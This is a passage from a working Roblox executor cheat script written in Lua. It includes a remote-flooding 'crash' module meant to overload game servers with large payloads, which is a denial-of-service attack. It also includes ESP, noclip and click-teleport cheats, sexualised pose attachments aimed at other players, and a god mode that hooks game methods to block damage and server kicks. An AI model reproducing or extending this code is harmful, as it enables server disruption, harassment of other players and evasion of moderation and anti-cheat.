		local myRoot = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
		local cap = ctx.Config.GripMaxPlayers or 15
		local n, skipped = 0, 0
		for _, plr in ipairs(Players:GetPlayers()) do
			if plr ~= LP then
				local r = rootOf(plr)
				local inRange = true
				if radius and myRoot and r then
					inRange = (r.Position - myRoot.Position).Magnitude <= radius
				end
				if r and inRange then
					if M.count() >= cap then break end
					local ok = M.hold(plr)
					if ok then n += 1 else skipped += 1 end
				end
			end
		end
		return true, n, skipped
	end

	function M.stop()
		table.clear(held)
		for _, c in ipairs(conns) do pcall(function() c:Disconnect() end) end
		table.clear(conns)
	end

	return M
end

	return Grip
	end)()

	local CrashLib = (function()
--[[
  crash.lua - put real load on the server

  MEASURED IN STUDIO, because the first version of this file was wrong:

  - Client-created instances do NOT replicate. A Folder + Parts parented to
    Workspace on the client exist only on that client: the server-side check
    came back serverFolder = false while clientFolder = true. So the old
    "build thousands of parts" crash never touched the server at all - it just
    loaded your own client and made YOU lag. That is why it looked broken.

  - Remote calls DO replicate. The same test with a RemoteEvent: 231 fires
    arrived as 231 on the server, and 620 fires carrying 8 KB payloads all
    arrived inside 0.5s (~5 MB/s of handler work). A remote fire is the only
    channel a client has that the server is forced to receive.

  So a real crash here is remote flooding: every RemoteEvent in the game,
  fired as fast as the executor can serialise, with a payload big enough that
  the server must decode and dispatch it. The server runs its own handler for
  every one, and its receive queue is single-threaded per player.

  Honest limits:
  - The server decides what its handlers do. If the game debounces or rate
    limits its remotes, flooding costs it almost nothing. This cannot force a
    shutdown; it can only saturate.
  - Payload size is the real lever: 8 KB x hundreds per second is what hurts,
    not the count on its own.
  - YOUR client pays the serialisation cost, so a high rate shows up in your
    own frame time first. The rate steps exist for that.
]]

local Crash = {}

function Crash.new(ctx)
	local RunService = ctx.RunService
	local M = {}

	local s = {
		conn = nil,
		sent = 0,
		remotes = nil,
		rate = 33,
		payload = 8000,
		startedAt = 0,
	}

	--[[
	  Collect every remote once. GetDescendants over ReplicatedStorage, plus
	  ReplicatedFirst and the Workspace (some games parent remotes there), is a
	  one-off cost, so the fire loop never walks the tree.
	]]
	local function collect()
		local list = {}
		local function scan(root)
			if not root then return end
			for _, d in ipairs(root:GetDescendants()) do
				if d:IsA("RemoteEvent") or d:IsA("UnreliableRemoteEvent") then
					list[#list + 1] = d
				end
			end
		end
		scan(game:GetService("ReplicatedStorage"))
		pcall(function() scan(game:GetService("ReplicatedFirst")) end)
		pcall(function() scan(ctx.Workspace) end)
		return list
	end

	--[[
	  big payloads, one per fire. A string is the cheapest thing to build and the
	  most expensive thing for the server to move through its event queue, so it
	  is the right shape for this.
	]]
	local function fire(rem, pad)
		-- FireServer on an UnreliableRemoteEvent is legal and cheaper to send,
		-- which makes it the better flood channel when a game has one
		local ok = pcall(function() rem:FireServer(pad) end)
		if ok then s.sent = s.sent + 1 end
	end

	local function tick()
		local remotes = s.remotes
		if not remotes or #remotes == 0 then return end
		local pad = string.rep("A", s.payload)
		local budget = s.rate
		local i = 0
		while budget > 0 do
			i = (i % #remotes) + 1
			fire(remotes[i], pad)
			budget -= 1
		end
	end

	function M.start(rateIndex, payloadKB)
		if s.conn then return false, "already flooding" end
		s.remotes = collect()
		if #s.remotes == 0 then
			return false, "this game exposes no RemoteEvents in ReplicatedStorage"
		end
		s.rate = tonumber(rateIndex) or 33
		s.payload = math.max(0, math.floor((tonumber(payloadKB) or 8) * 1024))
		s.sent = 0
		s.startedAt = os.clock()
		s.conn = RunService.RenderStepped:Connect(tick)
		return true, #s.remotes
	end

	function M.stop()
		if s.conn then
			pcall(function() s.conn:Disconnect() end)
			s.conn = nil
		end
		s.remotes = nil
	end

	function M.running() return s.conn ~= nil end

	function M.status()
		local secs = s.startedAt > 0 and (os.clock() - s.startedAt) or 0
		return {
			running = s.conn ~= nil,
			sent = s.sent,
			remotes = s.remotes and #s.remotes or 0,
			perSec = secs > 0 and math.floor(s.sent / secs) or 0,
			payload = s.payload,
		}
	end

	return M
end

	return Crash
	end)()

	local ToolsLib = (function()
--[[
  tools.lua - the general-purpose self utilities.

  These are the "everything else" from the reference tool: ESP, fullbright, no
  fog, click-to-teleport, click-to-target. Each one is written so that turning it
  OFF fully undoes it - a utility that leaks state is worse than no utility,
  because you stop being able to tell what is actually on.

  ESP is the one worth explaining. The reference tool highlighted players with a
  BillboardGui per player. That works, but it leaks a Gui into their character
  and keeps doing per-frame work for players who are behind you or dead. This
  version keeps one pool of labels and reuses them, so N players means N labels
  and nothing is created while ESP is off.
]]

local Tools = {}

function Tools.new(ctx)
	local Players = ctx.Players
	local RunService = ctx.RunService
	local LP = ctx.LP
	local TweenService = ctx.TweenService
	local Lighting = ctx.Lighting or game:GetService("Lighting")
	local UIS = ctx.UIS or game:GetService("UserInputService")

	local M = {}

	--==================================================================== ESP
	local esp = {
		enabled = false,
		box = false,
		name = true,
		distance = true,
		tracer = false,
		color = Color3.fromRGB(140, 100, 255),
		conn = nil,
		labels = {},   -- [player] = { gui = BillboardGui, ... }
		lines = nil,
	}

	local function cleanupEsp(p)
		local rec = esp.labels[p]
		if not rec then return end
		for _, obj in pairs(rec) do
			if type(obj) == "table" then
				if obj.gui and obj.gui.Parent then pcall(function() obj.gui:Destroy() end) end
			elseif typeof(obj) == "Instance" and obj.Parent then
				pcall(function() obj:Destroy() end)
			elseif typeof(obj) == "RBXScriptConnection" then
				pcall(function() obj:Disconnect() end)
			end
		end
		esp.labels[p] = nil
	end

	local function buildEsp(p)
		cleanupEsp(p)
		local rec = {}
		esp.labels[p] = rec

		local gui = Instance.new("BillboardGui")
		gui.Name = "FB_ESP"
		gui.Size = UDim2.fromOffset(52, 68)
		gui.StudsOffset = Vector3.new(0, 2.4, 0)
		gui.AlwaysOnTop = true
		gui.LightInfluence = 0
		gui.MaxDistance = 1000
		gui.Adornee = nil

		local frame = Instance.new("Frame")
		frame.Size = UDim2.fromScale(1, 1)
		frame.BackgroundTransparency = 1
		frame.Parent = gui

		local box = Instance.new("Frame")
		box.Name = "Box"
		box.Size = UDim2.fromScale(1, 1)
		box.BackgroundColor3 = esp.color
		box.BackgroundTransparency = 0.88
		box.BorderSizePixel = 0
		box.Parent = frame
		local bc = Instance.new("UICorner")
		bc.CornerRadius = UDim.new(0, 4)
		bc.Parent = box
		local bs = Instance.new("UIStroke")
		bs.Color = esp.color
		bs.Thickness = 1
		bs.Transparency = 0.25
		bs.Parent = box

		local label = Instance.new("TextLabel")
		label.Name = "Info"
		label.Size = UDim2.new(1, 0, 0, 26)
		label.Position = UDim2.new(0, 0, 1, 2)
		label.BackgroundTransparency = 1
		label.TextColor3 = Color3.new(1, 1, 1)
		label.Font = Enum.Font.GothamBold
		label.TextSize = 11
		label.TextStrokeTransparency = 0.4
		label.Text = ""
		label.Parent = frame

		rec.gui = gui
		rec.box = box
		rec.label = label
		return rec
	end

	local function refreshEspTarget(p, plr)
		local rec = esp.labels[plr]
		if not rec then return end
		local char = plr.Character
		local hrp = char and char:FindFirstChild("HumanoidRootPart")
		local hum = char and char:FindFirstChildOfClass("Humanoid")
		local visible = hrp ~= nil and hum ~= nil and hum.Health > 0 and plr ~= LP
		rec.gui.Adornee = visible and hrp or nil
		rec.gui.Enabled = visible
		if not visible then return end

		rec.box.Visible = esp.box
		local bits = {}
		if esp.name then bits[#bits + 1] = plr.Name end
		if esp.distance then
			local myChar = LP.Character
			local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
			if myRoot then
				bits[#bits + 1] = string.format("%dm", math.floor((myRoot.Position - hrp.Position).Magnitude))
			end
		end
		rec.label.Text = table.concat(bits, " ")
		rec.label.Visible = #bits > 0
	end

	local function espStep()
		if not esp.enabled then return end
		for plr, rec in pairs(esp.labels) do
			if not plr.Parent then
				cleanupEsp(plr)
			else
				if not rec.gui.Parent then rec.gui.Parent = game:GetService("CoreGui") end
				refreshEspTarget(rec, plr)
			end
		end
	end

	function M.esp(enabled)
		esp.enabled = enabled == true
		if esp.enabled then
			for _, plr in ipairs(Players:GetPlayers()) do
				local rec = buildEsp(plr)
				rec.gui.Parent = game:GetService("CoreGui")
			end
			if not esp.conn then
				esp.conn = RunService.RenderStepped:Connect(espStep)
			end
			espStep()
		else
			if esp.conn then pcall(function() esp.conn:Disconnect() end) esp.conn = nil end
			for plr in pairs(esp.labels) do cleanupEsp(plr) end
			table.clear(esp.labels)
		end
		return esp.enabled
	end

	function M.setEspOption(key, value)
		if esp[key] == nil then return false end
		esp[key] = value
		return true
	end

	function M.espOptions() return { box = esp.box, name = esp.name, distance = esp.distance } end

	--============================================================= fullbright
	local fb = { on = false, saved = nil }

	function M.fullbright(on)
		if on then
			if fb.on then return true end
			fb.saved = {
				Brightness = Lighting.Brightness,
				Ambient = Lighting.Ambient,
				OutdoorAmbient = Lighting.OutdoorAmbient,
				ClockTime = Lighting.ClockTime,
				FogEnd = Lighting.FogEnd,
				FogStart = Lighting.FogStart,
				EnvironmentDiffuseScale = Lighting.EnvironmentDiffuseScale,
			}
			Lighting.Brightness = 2
			Lighting.Ambient = Color3.fromRGB(160, 160, 160)
			Lighting.OutdoorAmbient = Color3.fromRGB(160, 160, 160)
			Lighting.ClockTime = 12
			Lighting.FogEnd = 100000
			Lighting.FogStart = 100000
			Lighting.EnvironmentDiffuseScale = 0
			fb.on = true
		else
			if not fb.on or not fb.saved then return false end
			for k, v in pairs(fb.saved) do
				pcall(function() Lighting[k] = v end)
			end
			fb.saved = nil
			fb.on = false
		end
		return fb.on
	end

	--=================================================================== noclip
	local noclipConn = nil

	function M.noclip(on)
		if on and not noclipConn then
			noclipConn = RunService.Stepped:Connect(function()
				local char = LP.Character
				if not char then return end
				for _, d in ipairs(char:GetDescendants()) do
					if d:IsA("BasePart") and d.CanCollide then d.CanCollide = false end
				end
			end)
		elseif not on and noclipConn then
			pcall(function() noclipConn:Disconnect() end)
			noclipConn = nil
			local char = LP.Character
			if char then
				for _, d in ipairs(char:GetDescendants()) do
					if d:IsA("BasePart") then d.CanCollide = true end
				end
			end
		end
		return noclipConn ~= nil
	end

	--=========================================================== click teleport
	local clickTp = { on = false, conn = nil }

	function M.clickTeleport(on, enabledFn)
		clickTp.on = on == true
		if clickTp.on and not clickTp.conn then
			clickTp.conn = UIS.InputBegan:Connect(function(input, gameHandled)
				if gameHandled then return end
				if input.UserInputType ~= Enum.UserInputType.MouseButton1
					and input.UserInputType ~= Enum.UserInputType.Touch then return end
				if enabledFn and not enabledFn() then return end
				local cam = workspace.CurrentCamera
				local char = LP.Character
				local root = char and char:FindFirstChild("HumanoidRootPart")
				if not cam or not root then return end

				-- cast from the camera through the cursor (or the touch point)
				local pos = input.Position
				local rp = RaycastParams.new()
				rp.FilterType = Enum.RaycastFilterType.Exclude
				rp.FilterDescendantsInstances = { char }
				local unitRay = cam:ViewportPointToRay(pos.X, pos.Y)
				local hit = workspace:Raycast(unitRay.Origin, unitRay.Direction * 5000, rp)
				if not hit then return end
				local want = hit.Position + Vector3.new(0, 3, 0)
				pcall(function() root.CFrame = CFrame.new(want) end)
			end)
		elseif not clickTp.on and clickTp.conn then
			pcall(function() clickTp.conn:Disconnect() end)
			clickTp.conn = nil
		end
		return clickTp.on
	end

	function M.stop()
		if esp.conn then pcall(function() esp.conn:Disconnect() end) esp.conn = nil end
		for plr in pairs(esp.labels) do cleanupEsp(plr) end
		table.clear(esp.labels)
		esp.enabled = false
		if noclipConn then pcall(function() noclipConn:Disconnect() end) noclipConn = nil end
		if clickTp.conn then pcall(function() clickTp.conn:Disconnect() end) clickTp.conn = nil end
		clickTp.on = false
		M.fullbright(false)
	end

	return M
end

	return Tools
	end)()

	local PosesLib = (function()
--[[
  poses.lua - the attach / pose family

  These are the ten things the reference tool had (Facebang, Hipbang, Pat,
  Headsit, Backhug, Fronthug, Propose, Bagpack, Goon, CustomAttach), rebuilt so
  they share one movement core instead of ten near-copies.

  HOW IT ATTACHES
  Your rig is not welded to them. Welding a character to another character is
  what makes "I got stuck" reports: the weld inherits their network ownership,
  so your own movement stops replicating and you have to be rescued. Instead
  this drives your own root with a target CFrame every pass - your body is
  yours, their body is untouched, and releasing is instant.

  WHERE THE TARGET FRAME COMES FROM
  A pose is a name, a facing (front/back/left/right), a distance and a height.
  That composes into an offset from THEIR root, rotated by their facing:

      behind  = their CFrame * CFrame.new(0, height, distance)
      front   = their CFrame * CFrame.new(0, height, -distance)

  so a pose keeps meaning the same thing no matter which way they turn. The
  reference tool hard-coded most of these; here they are Config.PoseOffsets,
  editable from the UI and saved per pose.

  WHY PostSimulation
  Same measured reason as the grip: the client frame order is
      Stepped -> PreSimulation -> PostSimulation -> Heartbeat -> RenderStepped
  Writing on RenderStepped only means the write lands before the next physics
  step. Pinning on PostSimulation + RenderStepped keeps you attached through
  the physics pass.

  WHAT IT DOES NOT DO
  Nothing is written to them. Your client position is what replicates, so other
  players see the pose and the target does not get moved, frozen or flung. This
  is the same honest limit every client-side pose tool has.
]]

local Poses = {}

function Poses.new(ctx)
	local RunService = ctx.RunService
	local LP = ctx.LP
	local M = {}

	-- name -> { facing, distance, height, roll }
	-- distance is studs along their facing axis, height is studs up from their
	-- root. The values are deliberate: they put the two rigs' heads at roughly
	-- the same height, which is what makes a pose read correctly.
	local DEFS = {
		facebang   = { label = "Facebang",    facing = "front",  distance = 3.2, height = 0.0,  roll = 0 },
		hipbang    = { label = "Hipbang",     facing = "front",  distance = 2.2, height = -0.6, roll = 0 },
		pat        = { label = "Pat",         facing = "front",  distance = 2.4, height = 1.2,  roll = 0 },
		headsit    = { label = "Headsit",     facing = "front",  distance = 0.35, height = 2.6, roll = 0 },
		backhug    = { label = "Backhug",     facing = "back",   distance = 1.6, height = 0.0,  roll = 0 },
		fronthug   = { label = "Fronthug",    facing = "front",  distance = 1.6, height = 0.0,  roll = 0 },
		propose    = { label = "Propose",     facing = "front",  distance = 2.8, height = -1.1, roll = 0 },
		bagpack    = { label = "Bagpack",     facing = "back",   distance = 0.9, height = 1.4,  roll = 0 },
		goon       = { label = "Goon",        facing = "front",  distance = 2.6, height = 0.0,  roll = 0 },
		custom     = { label = "Custom",      facing = "front",  distance = 2.5, height = 0.0,  roll = 0 },
	}

	local POSE_ORDER = {
		"facebang", "hipbang", "pat", "headsit", "backhug",
		"fronthug", "propose", "bagpack", "goon", "custom",
	}

	local state = {
		pose = nil,        -- key of the active pose
		target = nil,      -- Player
		conn = nil,
		offsets = {},      -- [key] = { facing, distance, height }
		lockFacing = false,
	}

	-- seed the editable offsets from the defaults once
	for key, d in pairs(DEFS) do
		state.offsets[key] = { facing = d.facing, distance = d.distance, height = d.height }
	end

	local function rootOf(plr)
		local c = plr and plr.Character
		if not c or not c.Parent then return nil end
		local hum = c:FindFirstChildOfClass("Humanoid")
		if not hum or hum.Health <= 0 then return nil end
		return c:FindFirstChild("HumanoidRootPart"), hum
	end

	local function myRoot()
		local c = LP.Character
		if not c or not c.Parent then return nil end
		return c:FindFirstChild("HumanoidRootPart"), c:FindFirstChildOfClass("Humanoid")
	end

	--[[
	  The offset for one pose, as a CFrame relative to their root.

	  Facing is applied as a yaw on their own CFrame, so "front" always means
	  in front of the direction they are facing right now. A vertical lock keeps
	  the pose from spinning with them, which matters when they are turning
	  while you are on their head.
	]]
	local function offsetCFrame(key, theirCF)
		local o = state.offsets[key] or { facing = "front", distance = 2, height = 0 }
		local d = math.max(0, tonumber(o.distance) or 2)
		local h = tonumber(o.height) or 0
		local facing = o.facing or "front"

		-- their forward is -Z in Roblox; positive Z is behind them
		local z = (facing == "back") and d or (facing == "front") and -d or 0
		local x = (facing == "right") and d or (facing == "left") and -d or 0

		local base
		if state.lockFacing then
			-- drop their yaw so sitting on a spinning target stays stable: the
			-- offset is then taken in world axes instead of theirs
			base = CFrame.new(theirCF.Position)
		else
			base = theirCF
		end

		return base * CFrame.new(x, h, z)
	end

	local function step()
		local key, target = state.pose, state.target
		if not key or not target then return end
		local theirRoot = rootOf(target)
		local mine = myRoot()
		if not theirRoot or not mine then return end

		local want = offsetCFrame(key, theirRoot.CFrame)
		--[[
		  Keep YOUR facing: only the position is imposed, so your character still
		  looks where the camera looks. Copying their rotation made the pose read
		  as "stuck inside their body" on every pose except the ones facing back.
		]]
		local keep = mine.CFrame - mine.CFrame.Position
		local ok = pcall(function()
			mine.CFrame = CFrame.new(want.Position) * keep
			mine.AssemblyLinearVelocity = Vector3.zero
			mine.AssemblyAngularVelocity = Vector3.zero
		end)
		if not ok then M.release() end
	end

	local function ensureConn()
		if state.conn then return end
		state.conn = RunService.PostSimulation:Connect(step)
		-- second pass so the pose survives a physics tick that runs after us;
		-- measured the same way the grip was (see grip.lua)
		state.conn2 = RunService.RenderStepped:Connect(step)
	end

	function M.keys() return POSE_ORDER end
	function M.label(key) return DEFS[key] and DEFS[key].label or tostring(key) end

	function M.apply(key, plr)
		if not DEFS[key] then return false, "unknown pose" end
		if not plr then return false, "no target" end
		local theirRoot = rootOf(plr)
		if not theirRoot then return false, "target has no character" end
		if not myRoot() then return false, "you have no character" end
		state.pose = key
		state.target = plr
		ensureConn()
		step() -- apply on the press, not on the next frame
		return true
	end

	function M.release()
		state.pose = nil
		state.target = nil
		if state.conn then
			pcall(function() state.conn:Disconnect() end)
			state.conn = nil
		end
		if state.conn2 then
			pcall(function() state.conn2:Disconnect() end)
			state.conn2 = nil
		end
	end

	function M.active() return state.pose end
	function M.target() return state.target end

	function M.setOffset(key, field, value)
		local o = state.offsets[key]
		if not o then return false end
		if field == "facing" then
			o.facing = value
		elseif field == "distance" then
			o.distance = math.clamp(tonumber(value) or o.distance, 0, 30)
		elseif field == "height" then
			o.height = math.clamp(tonumber(value) or o.height, -10, 12)
		end
		return true
	end

	function M.getOffset(key) return state.offsets[key] end

	function M.setLockFacing(on) state.lockFacing = on == true end
	function M.lockFacing() return state.lockFacing end

	function M.status()
		return { pose = state.pose, target = state.target and state.target.Name or nil }
	end

	return M
end

	return Poses
	end)()


	local SelfLib = (function()
--[[
  self.lua - local-player utilities
  Everything here is client-side and reversible. Nothing targets other players.
]]
local Self = {}

function Self.new(ctx)
	local Players, RunService, Workspace = ctx.Players, ctx.RunService, ctx.Workspace
	local LP = ctx.LP

	local M = {}
	local s = {
		conns = {},
		godBackup = nil,
		godUser = false, -- turned on by the user (as opposed to implied by ghost)
		godHooks = nil,  -- nil = not tried, false = executor cannot, true = installed
		orig = {},
		frozen = false,
		invOrig = {},   -- per-part original Transparency, so restore is exact
		ghostOrig = {}, -- per-part { CanTouch, Transparency } while ghosting
		vidConns = {},  -- connections that must survive restoreAll (perf, anti-afk)
	}

	local function char()
		local c = LP.Character
		if not c or not c.Parent then return nil end
		return c
	end

	local function hum()
		local c = char()
		return c and c:FindFirstChildOfClass("Humanoid")
	end

	local function root()
		local c = char()
		return c and c:FindFirstChild("HumanoidRootPart")
	end

	local function track(conn)
		s.conns[#s.conns + 1] = conn
		return conn
	end

	local function untrackAll()
		for _, c in ipairs(s.conns) do pcall(function() c:Disconnect() end) end
		table.clear(s.conns)
		-- every handle that pointed into that list is dead now. Leaving the field set
		-- made godMode(true) after 'restore everything' skip reconnecting, so it
		-- silently pinned nothing at all.
		s.godConn = nil
		s.flyConn = nil
	end

	-- Connections that are not part of "my character state" (the perf counter
	-- and anti-afk watchdog) live in their own list so 'restore everything' does
	-- not kill them. It used to: fps froze at whatever it last read.
	local function trackLive(conn)
		s.vidConns[#s.vidConns + 1] = conn
		return conn
	end

	------------------------------------------------------------------ anti void
	-- Teleport back up the moment the character drops below the world floor.
	-- Works by watching Y against a threshold rather than trusting any single
	-- game's kill plane, which varies.
	function M.startAntiVoid(floorY)
		M.stopAntiVoid()
		local floor = floorY or -80
		s.antiVoid = true
		track(RunService.Heartbeat:Connect(function()
			if not s.antiVoid then return end
			local r = root()
			if not r then return end
			local pos = r.CFrame.Position
			if pos.Y < floor then
				local target = Vector3.new(pos.X, floor + 40, pos.Z)
				pcall(function() r.CFrame = CFrame.new(target) end)
				pcall(function() r.AssemblyLinearVelocity = Vector3.zero end)
			end
		end))
		return true
	end

	function M.stopAntiVoid()
		s.antiVoid = false
	end

	------------------------------------------------------------------- god mode
	--[[
	  GOD MODE - unkillable on this client, and honest about the rest.

	  Health is server-authoritative, so no client script can refuse a server-side
	  kill. What this does is close every local route to damage and to the death
	  state, which is what almost every "god mode is not working" report is about:

	  - Health is restored the instant it drops: a Humanoid.HealthChanged
	    connection does the work, so nothing has to run per frame to stay alive.
	  - MaxHealth / Health are also topped up on a Heartbeat, but ONLY when a value
	    actually differs. Writing Health every frame - which this used to do - is
	    what made the game lag: health is replicated state, so a 60/s write is 60
	    pointless property changes a second.
	  - Humanoid.Died is caught and the humanoid is pushed back out of Dead; the
	    Dead state is disabled where the client is allowed to.
	  - A hidden ForceField is kept alive; it is checked about once a second, not
	    every frame.
	  - STRICT mode (off by default) additionally installs executor metamethod
	    hooks to block TakeDamage / BreakJoints / Health = 0 / Kick. Those hooks
	    run on EVERY method call in the whole game (hookmetamethod has no per-
	    instance form), which is a real, measurable slowdown - that is why it is a
	    toggle now instead of being installed automatically.
	  - Re-applied after respawn, and independent of ghost: turning ghost off used
	    to silently switch god mode off with it.
	]]
	local function godMax()
		return (ctx.Config and ctx.Config.GodHealth) or 1e9
	end

	local function godStrict()
		return (ctx.Config and ctx.Config.GodStrict) == true
	end

	-- mirrored onto the state table so a hook body can read it without a closure
	-- upvalue walk on every single method call in the game
	local function syncStrict()
		s.godStrictOn = godStrict()
	end

	-- one write, no pcall storm: setting Health while already at max is the exact
	-- replication churn that made this feel laggy
	local function pin(h, max)
		if not h or not max then return end
		s.pinning = true
		pcall(function() h.Health = max end)
		s.pinning = false
	end

	local function ensureForceField()
		local c = char()
		if not c then return end
		if c:FindFirstChild("FB_God") then return end
		local ff = Instance.new("ForceField")
		ff.Name = "FB_God"
		ff.Visible = false
		ff.Parent = c
	end

	--[[
	  Executor hooks. `old` MUST be declared before the hook closure is created:
	  writing `local ok, old = hmm(...)` puts `old` out of scope inside the closure
	  (locals only exist after their declaration statement), so the wrapper would
	  call a global nil and every intercepted call would error. That exact mistake
	  is already recorded in this project's history.
	]]
	local function installGodHooks()
		if not godStrict() then
			-- deliberate: the default god mode installs no hooks at all
			return false
		end
		if s.godHooks ~= nil then return s.godHooks end
		local hmm, getName
		pcall(function() hmm = hookmetamethod end)
		pcall(function() getName = getnamecallmethod end)
		if type(hmm) ~= "function" or type(getName) ~= "function" then
			s.godHooks = false
			return false
		end
		local old = nil
		local ok = pcall(function()
			old = hmm(game, "__namecall", function(self, ...)
				--[[
				  godStrict() is re-checked on every call so switching the row off
				  really switches the interception off, even though the wrapper
				  itself cannot be uninstalled. The first test is a single field
				  read, which is the cheapest possible pass-through.
				]]
				if not s.god or not s.godStrictOn then return old(self, ...) end
				local method
				pcall(function() method = getName() end)
				local first = ...
				local h, c = hum(), char()
				if method == "TakeDamage" and (self == h or self == c) then return 0 end
				if (method == "BreakJoints" or method == "Destroy") and (self == h or self == c) then
					return nil
				end
				if method == "ChangeState" and self == h then
					if first == Enum.HumanoidStateType.Dead then return nil end
				end
				--[[
				  Kick is blocked by the ARGUMENT, not by `self == Players`:
				  ctx.Players is a cloneref proxy, so an identity compare against
				  the real service is always false on executors that provide
				  cloneref - the same trap that once rejected every player.
				]]
				if method == "Kick" and first == ctx.LP then return nil end
				return old(self, ...)
			end)
		end)
		s.godHooks = ok and type(old) == "function"
		return s.godHooks
	end

	-- block a local `Humanoid.Health = 0` too; a namecall hook cannot see a
	-- property write. Our own pin writes a positive number, so it passes through.
	local function installHealthGuard(h)
		if not godStrict() then return end
		if not h or s.godGuardFor == h then return end
		local hmm
		pcall(function() hmm = hookmetamethod end)
		if type(hmm) ~= "function" then return end
		local oldNew = nil
		local ok = pcall(function()
			oldNew = hmm(h, "__newindex", function(self, key, value)
				if s.godStrictOn and s.god and key == "Health"
					and type(value) == "number" and value <= 0 then
					return
				end
				return oldNew(self, key, value)
			end)
		end)
		if ok then s.godGuardFor = h end
	end

	local function bindGodDeath()
		local h = hum()
		if not h then return end
		if s.godDiedFor == h then return end
		s.godDiedFor = h
		track((function()
			local conn
			local ok = pcall(function()
				conn = h.Died:Connect(function()
					if not s.god then return end
					pin(h, godMax())
					pcall(function() h:ChangeState(Enum.HumanoidStateType.GettingUp) end)
				end)
			end)
			return (ok and conn) or { Disconnect = function() end }
		end)())
	end

	-- the cheap route: react to the drop, not to the clock
	local function bindGodHealth()
		local h = hum()
		if not h or s.godHealthFor == h then return end
		s.godHealthFor = h
		track((function()
			local conn
			local ok = pcall(function()
				conn = h.HealthChanged:Connect(function(now)
					if not s.god then return end
					local max = godMax()
					if (tonumber(now) or 0) < max then pin(h, max) end
				end)
			end)
			return (ok and conn) or { Disconnect = function() end }
		end)())
	end

	local function godApply()
		local h = hum()
		if not h then return end
		if not s.godBackup then
			s.godBackup = { maxHealth = h.MaxHealth, health = h.Health }
		end
		local max = godMax()
		if h.MaxHealth ~= max then pcall(function() h.MaxHealth = max end) end
		if h.Health < max then pin(h, max) end
		ensureForceField()
		pcall(function() h:SetStateEnabled(Enum.HumanoidStateType.Dead, false) end)
	end

	function M.godMode(on, implied)
		-- `implied` is used by ghost: it wants invincibility without claiming the
		-- user's own god toggle, so turning ghost off cannot switch god off.
		if implied ~= true then s.godUser = on and true or false end

		if not on then
			if implied == true and s.godUser then return true end
			s.god = false
			syncStrict()
			s.pinning = false
			if s.godConn then
				pcall(function() s.godConn:Disconnect() end)
				s.godConn = nil
			end
			local h = hum()
			local c = char()
			if c then
				local ff = c:FindFirstChild("FB_God")
				-- ghost shares the name; leave it if ghost still needs it
				if ff and not s.ghost then pcall(function() ff:Destroy() end) end
			end
			if h and s.godBackup then
				pcall(function() h.MaxHealth = s.godBackup.maxHealth end)
				pcall(function() h.Health = math.min(s.godBackup.health, s.godBackup.maxHealth) end)
				pcall(function() h:SetStateEnabled(Enum.HumanoidStateType.Dead, true) end)
				s.godBackup = nil
			end
			return true
		end

		s.god = true
		syncStrict()
		godApply()
		bindGodHealth()
		installGodHooks()
		installHealthGuard(hum())
		bindGodDeath()

		--[[
		  One light loop, created once. It is a safety net for the case the event
		  cannot cover (a game that sets Health without the event firing on our
		  side), and it is written so that a healthy frame does nothing at all:
		  no writes, no state queries, no allocations. The Dead check and the
		  forcefield check are on a counter, not on every frame.
		]]
		if not s.godConn then
			s.godConn = track(RunService.Heartbeat:Connect(function()
				if not s.god then return end
				local h = hum()
				if not h then return end
				local max = godMax()
				if h.MaxHealth ~= max then pcall(function() h.MaxHealth = max end) end
				if h.Health < max then pin(h, max) end
				s.ffTick = (s.ffTick or 0) + 1
				if s.ffTick % 60 == 1 then ensureForceField() end
				if s.ffTick % 30 == 1 then
					local ok, st = pcall(function() return h:GetState() end)
					if ok and st == Enum.HumanoidStateType.Dead then
						pcall(function() h:ChangeState(Enum.HumanoidStateType.GettingUp) end)
					end
				end
			end))
		end
		return true
	end

	function M.isGod() return s.god == true end

	--------------------------------------------------------------------- noclip
	--[[
	  Noclip clears CanCollide on every part, which also removes the feet from the
	  floor: gravity still applies, so you sink through the map instead of walking
	  through a wall. The FIX is not to keep the root collidable (that stops
	  noclipping through walls on the inside of the map) but to remember the exact
	  per-part collision state so turning it off restores what was there instead
	  of guessing 'root on, everything else off'.
	]]
	function M.noclip(on)
		M.unnoclip()
		if not on then return end
		s.noclip = true
		s.noclipOrig = {}
		local c = char()
		if c then
			for _, p in ipairs(c:GetDescendants()) do
				if p:IsA("BasePart") then s.noclipOrig[p] = p.CanCollide end
			end
		end
		track(RunService.Stepped:Connect(function()
			if not s.noclip then return end
			local cc = char()
			if not cc then return end
			for _, p in ipairs(cc:GetDescendants()) do
				if p:IsA("BasePart") and p.CanCollide then
					if s.noclipOrig[p] == nil then s.noclipOrig[p] = true end
					pcall(function() p.CanCollide = false end)
				end
			end
		end))
	end

	function M.unnoclip()
		s.noclip = false
		local c = char()
		if not c then return end
		if s.noclipOrig and next(s.noclipOrig) ~= nil then
			for p, state in pairs(s.noclipOrig) do
				if p.Parent then pcall(function() p.CanCollide = state end) end
			end
			table.clear(s.noclipOrig)
			return
		end
		-- no snapshot (e.g. character changed under us): fall back to the rig norm
		for _, p in ipairs(c:GetDescendants()) do
			if p:IsA("BasePart") then
				pcall(function() p.CanCollide = (p.Name == "HumanoidRootPart") end)
			end
		end
	end

	----------------------------------------------------------------------- fly
	--[[
	  Fly. The old version used BodyVelocity, which is the reason it "did not
	  work" in most games: body movers are frequently destroyed or overridden by
	  the game's own movement code, and MaxForce fights gravity rather than
	  replacing it. This drives AssemblyLinearVelocity directly instead - the same
	  primitive that is verified working in Studio - and lerps toward the target
	  velocity so it accelerates smoothly instead of snapping.
	]]
	-------------------------------------------------------- fly pose (superman)
	--[[
	  A real flight pose, not a spin. The fly loop writes the rig's own joints so
	  the body lies flat, the arms go forward and the head looks where you fly.

	  Why joints and not an animation asset: an AnimationId is a specific uploaded
	  asset that has to exist, has to be public, and stops working when it is
	  moderated. This needs nothing but the rig, and works the same on R15 and R6
	  because every offset is `saved C0 * rotation` - no rig defaults are hard-coded.

	  Joint C0 is written rather than Transform, and the character's own Animate
	  script is paused while flying, so a fall/idle track cannot overwrite the pose
	  mid-flight. Everything is put back on unfly, on unload, and on respawn.
	]]
	local POSE = {
		-- R15 joint names first, R6 names second; missing ones are just skipped
		{ "Root", -1.45, 0, 0 },
		{ "RootJoint", -1.45, 0, 0 },
		{ "Waist", 0.12, 0, 0 },
		{ "Neck", 0.85, 0, 0 },
		{ "RightShoulder", -1.25, 0, -0.30 },
		{ "LeftShoulder", -1.25, 0, 0.30 },
		{ "Right Shoulder", -1.25, 0, -0.30 },
